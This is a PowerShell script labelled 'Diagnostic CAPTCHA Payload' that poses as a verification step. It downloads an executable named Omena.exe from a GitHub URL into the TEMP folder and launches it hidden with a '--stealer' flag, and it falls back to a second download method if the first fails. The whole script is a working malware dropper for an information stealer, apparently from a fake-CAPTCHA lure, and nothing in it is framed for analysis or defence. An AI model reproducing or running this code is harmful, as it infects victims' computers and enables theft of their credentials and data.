# Diagnostic CAPTCHA Payload
Write-Host "Starting verification..." -ForegroundColor Cyan

try {
    $exePath = "$env:TEMP\Omena.exe"
    $url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"
    
    Write-Host "Downloading from GitHub..." -ForegroundColor Yellow
    
    $wc = New-Object Net.WebClient
    $wc.DownloadFile($url, $exePath)
    
    Write-Host "Download successful. Running stealer..." -ForegroundColor Green
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    Write-Host "Done." -ForegroundColor Green
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Trying alternative download method..." -ForegroundColor Yellow
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $exePath
        Write-Host "Alternative download successful." -ForegroundColor Green
        Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    } catch {
        Write-Host "Both download methods failed." -ForegroundColor Red
    }
}

Read-Host "Press Enter to close this window..."
